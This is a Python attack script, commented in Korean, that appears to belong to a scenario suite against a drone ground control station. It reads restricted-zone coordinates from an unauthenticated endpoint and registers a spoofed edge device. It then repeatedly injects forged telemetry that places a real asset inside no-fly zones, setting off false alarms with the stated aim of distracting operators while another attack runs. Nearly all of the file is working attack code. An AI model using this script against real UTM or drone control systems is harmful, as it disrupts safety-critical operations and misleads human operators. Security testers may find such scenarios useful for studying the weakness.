"""
Geofence Zone Violation Injection — 지오펜스 위반 유발 공격
독창 시나리오 #17 | arXiv:2409.08124 "Geofence Bypass via Telemetry Spoofing in UTM Systems"

GCS 취약점:
  - GET /api/scenario → 금지 구역(zones) boundary_points 무인증 노출
  - 텔레메트리 ingest 시 위치가 금지 구역 내부인지 서버 측 검증 없음
  - fused_position이 금지 구역 좌표면 경보 트리거 → 오탐 유발 가능

공격 전략:
  Phase 1 (정찰): GET /api/scenario 로 zones[*].boundary_points 수집
  Phase 2 (위반 주입): 합법 asset_id로 금지 구역 내부 좌표 텔레메트리 주입
                      → 대시보드 지도에 자산이 금지 구역 안에 표시
                      → 자동 경보 트리거 → 운용자 혼란 유발
  Phase 3 (충돌 시뮬레이션): 자산을 금지 구역 경계를 가로지르듯 이동
                             → 지오펜스 진입/이탈 반복 → 경보 포화

결과:
  - 오탐 경보로 운용자가 임무 일시 중단 지시
  - 실물 확인 위해 주의가 분산된 사이 실제 공격 실행 가능
"""
from __future__ import annotations

import argparse
import math
import time
from .common import GcsClient, wait_for_gcs


def _get_zones(client: GcsClient) -> list[dict]:
    """시나리오 금지 구역 목록 수집"""
    try:
        resp = client.get("/api/scenario")
        scenario = resp.get("payload", resp)
        zones = scenario.get("zones", [])
        restricted = [z for z in zones if z.get("zone_type") in ("restricted", "no_fly", "geofence")]
        print(f"[geofence] 금지 구역 {len(restricted)}개 발견:", flush=True)
        for z in restricted:
            print(f"  - {z.get('zone_id')} type={z.get('zone_type')} pts={z.get('boundary_points')}", flush=True)
        return restricted
    except Exception as e:
        print(f"[geofence] 구역 정보 조회 오류: {e}", flush=True)
        return []


def _zone_center(zone: dict) -> list[float] | None:
    """금지 구역의 중심 좌표 계산"""
    pts = zone.get("boundary_points", [])
    if not pts:
        return None
    xs = [p[0] if isinstance(p, list) else p.get("x", 0) for p in pts]
    ys = [p[1] if isinstance(p, list) else p.get("y", 0) for p in pts]
    zs = [p[2] if isinstance(p, (list, dict)) else 100 for p in pts] if all(len(p) > 2 if isinstance(p, list) else True for p in pts) else [100] * len(pts)
    return [sum(xs) / len(xs), sum(ys) / len(ys), sum(zs) / len(zs)]


def _inject_violation(
    client: GcsClient,
    asset_id: str,
    position: list[float],
    tick: int,
    edge_id: str,
) -> None:
    """금지 구역 내부 좌표로 텔레메트리 주입"""
    try:
        client.post("/api/telemetry/ingest", {
            "asset_id":         asset_id,
            "time_s":           tick % 420,
            "position":         position,
            "velocity_mps":     [5.0, 2.0, 0.0],
            "heading_deg":      (tick * 15) % 360,
            "status":           "edge-live",
            "source":           "GEOFENCE-VIOLATION",
            "source_id":        edge_id,
            "source_type":      "uav_edge",
            "source_authority": "EXTERNAL-ATTACKER",
            "track_confidence": 0.88,
            "link_profile":     "rf_spoofed",
            "battery_wh":       690.0,
        })
        print(
            f"[geofence] ★ 위반 주입 tick={tick:04d} | "
            f"asset={asset_id} | pos={[round(p, 1) for p in position]}",
            flush=True,
        )
    except Exception as e:
        print(f"[geofence] 주입 오류: {e}", flush=True)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Geofence Zone Violation Injection 공격")
    parser.add_argument("--service-url",   default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",  default="small-dronebot-01")
    parser.add_argument("--spoof-edge-id", default="edge-attack-geofence-01")
    parser.add_argument("--fallback-x",    type=float, default=800.0,
                        help="구역 정보 없을 때 사용할 금지 구역 추정 X 좌표")
    parser.add_argument("--fallback-y",    type=float, default=-900.0,
                        help="구역 정보 없을 때 사용할 금지 구역 추정 Y 좌표")
    parser.add_argument("--interval-s",    type=float, default=2.0)
    parser.add_argument("--duration-s",    type=float, default=90.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    # 공격 엣지 등록
    try:
        client.post("/api/edge/devices/register", {
            "edge_id":          args.spoof_edge_id,
            "device_type":      "uav_edge",
            "asset_ids":        [args.target_asset],
            "authority":        "EXTERNAL-ATTACKER",
            "link_profiles":    ["rf_spoofed"],
            "software_version": "geofence-inject-0.1",
        })
    except Exception:
        pass

    print(
        f"[geofence] Geofence Violation Injection 시작\n"
        f"  대상: {args.target_asset}\n"
        f"  원리: GCS는 ingest 시 위치를 금지 구역과 대조하지 않음",
        flush=True,
    )

    # Phase 1: 금지 구역 정찰
    zones = _get_zones(client)
    violation_positions: list[list[float]] = []

    if zones:
        for zone in zones[:3]:  # 최대 3개 구역
            center = _zone_center(zone)
            if center:
                violation_positions.append(center)
                # 구역 안에서 원형 궤도 포인트 추가
                for angle_deg in range(0, 360, 45):
                    angle = math.radians(angle_deg)
                    r = 30  # 반경 30m (구역 내부)
                    violation_positions.append([
                        center[0] + r * math.cos(angle),
                        center[1] + r * math.sin(angle),
                        center[2],
                    ])
    else:
        # 구역 정보 없는 경우 fallback 좌표 사용 (작전 외곽)
        print(f"[geofence] 구역 정보 없음 → fallback 좌표 사용", flush=True)
        fx, fy = args.fallback_x, args.fallback_y
        for angle_deg in range(0, 360, 30):
            angle = math.radians(angle_deg)
            r = 50
            violation_positions.append([
                fx + r * math.cos(angle),
                fy + r * math.sin(angle),
                100.0,
            ])

    start = time.time()
    tick = 0
    pos_count = len(violation_positions)

    print(f"[geofence] 위반 좌표 {pos_count}개 준비 완료", flush=True)

    while (time.time() - start) < args.duration_s:
        pos = violation_positions[tick % pos_count]
        _inject_violation(client, args.target_asset, pos, tick, args.spoof_edge_id)
        tick += 1
        time.sleep(args.interval_s)

    print(f"[geofence] 종료 — 총 {tick}회 위반 주입", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
